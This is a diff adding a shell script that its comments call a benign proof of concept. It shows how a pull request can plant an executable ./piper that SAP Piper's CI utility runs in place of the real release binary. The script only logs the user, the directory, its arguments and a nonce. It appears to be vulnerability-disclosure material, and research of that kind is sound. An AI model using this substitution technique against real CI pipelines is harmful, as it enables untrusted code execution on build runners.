@@ -1,0 +1,17 @@
+#!/bin/sh
+# Benign PoC. Supplied by the pull-request head, NOT by the repository owner.
+# Piper's PiperGoUtils.unstashPiperBin() sees `[ -x ./piper ]` succeed and skips
+# downloading the real binary, so this file runs instead of SAP's release artifact.
+NONCE=kp-piperbin-substitution-nonce-4f0c72
+{
+  echo "=== $(date -Is) argv: $* ==="
+  echo "uid=$(id -u) user=$(id -un) pwd=$(pwd)"
+  echo "nonce=$NONCE"
+} >> ./kp-piperbin-substitution-proof.txt 2>&1
+echo "KPPIPERSUB|$NONCE|argv=$*|uid=$(id -un)|pwd=$(pwd)" 1>&2
+case "$1" in
+  version)   echo "piper version kp-substituted-$NONCE" ;;
+  getConfig) echo '{}' ;;
+  *)         echo '{}' ;;
+esac
+exit 0
